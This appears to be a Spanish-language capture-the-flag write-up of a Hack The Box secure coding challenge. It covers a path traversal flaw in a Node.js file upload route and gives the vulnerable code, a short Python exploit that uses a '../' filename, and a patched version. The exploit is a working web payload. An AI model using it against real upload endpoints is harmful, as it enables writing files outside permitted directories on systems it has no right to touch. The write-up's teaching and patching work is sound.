---
title: "HTB Secure Coding S10 — ResourceHub: Path Traversal en File Upload"
date: 2026-04-20
description: "Writeup de ResourceHub Core (HTB Secure Coding Season 10). Path Traversal (CWE-22) en el filename del multipart upload permite escribir archivos arbitrarios fuera del directorio de recursos."
excerpt: "Path Traversal en filename de upload permite escribir fuera de resources/ usando ../ en el nombre del archivo enviado."
tags: ["HTB", "Secure Coding", "Web", "Path Traversal", "File Upload", "CWE-22", "Node.js", "formidable"]
platform: "HTB"
difficulty: "Easy"
image: "/images/blog/htb-resourcehub.png"
---

<div align="center">

![Author](https://img.shields.io/badge/Author-Flippermen-purple?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge)
![Season](https://img.shields.io/badge/Season-10-orange?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Web-blue?style=for-the-badge)

**Flippermen | CyberFlippers | UDLA-Cyber**

</div>

> **Disclaimer:** Writeup realizado en entorno autorizado de Hack The Box con fines educativos. Enfoque *Secure Coding* — identificar, explotar y parchear vulnerabilidades en código fuente.

---

| Campo | Valor |
|-------|-------|
| Challenge | ResourceHub Core |
| Dificultad | Easy |
| Categoría | Web |
| Puntos | 20 |
| Vulnerabilidad | Path Traversal (CWE-22) en filename de upload |
| Stack | Node.js / Express / formidable |

## Descripción

Portal de recursos con upload de archivos. El filename del multipart se usa directamente en `path.join()` sin sanitización.

## Vulnerabilidad

```javascript
// VULNERABLE — routes/routes.js
const targetFilename = file.originalFilename;  // controlado por el atacante
const targetPath = path.join(__dirname, '../resources', targetFilename);
fs.renameSync(file.filepath, targetPath);
// path.join resuelve ../ — permite escribir fuera de resources/
```

## Exploit

```python
import requests

BASE = "http://<IP>:<PORT>/challenge"

files = {
    'file': ('../static/js/pwned.txt', b'path_traversal_proof', 'text/plain')
}
requests.post(f"{BASE}/api/upload-resource",
    files=files, data={'category': 'test', 'priority': 'low'})

# El archivo queda en static/js/ accesible vía web
r = requests.get(f"{BASE}/js/pwned.txt")
print(r.text)  # → path_traversal_proof
```

## Parche

```javascript
// routes/routes.js
const targetFilename = path.basename(file.originalFilename);  // strip ../

if (!targetFilename || targetFilename === '') {
    return res.status(400).json({ success: false, error: 'Invalid filename' });
}

const targetPath = path.join(resourcesDir, targetFilename);

// Confirmar que el path resuelto sigue dentro del directorio permitido
if (!targetPath.startsWith(resourcesDir)) {
    return res.status(400).json({ success: false, error: 'Invalid file path' });
}

fs.renameSync(file.filepath, targetPath);
```

**Dos capas:** `path.basename()` elimina cualquier componente de directorio, y la verificación post-join confirma que el path resuelto sigue dentro de `resourcesDir`.

## Key Takeaways

1. **`path.join()` no sanitiza** — resuelve `../` fielmente. `path.basename()` + verificación post-join es el patrón correcto.
2. **Validar el path resultante, no el input** — incluso con `basename()`, siempre confirmar que el path final está dentro del directorio esperado.
3. **Nunca confiar en metadata del cliente** — el `filename` en multipart es completamente controlado por el atacante.

---

<div align="center">

**Flippermen**
*HackTheBox Season 10 — Platinum Tier | #1 Ecuador | CyberFlippers | UDLA-Cyber*

</div>
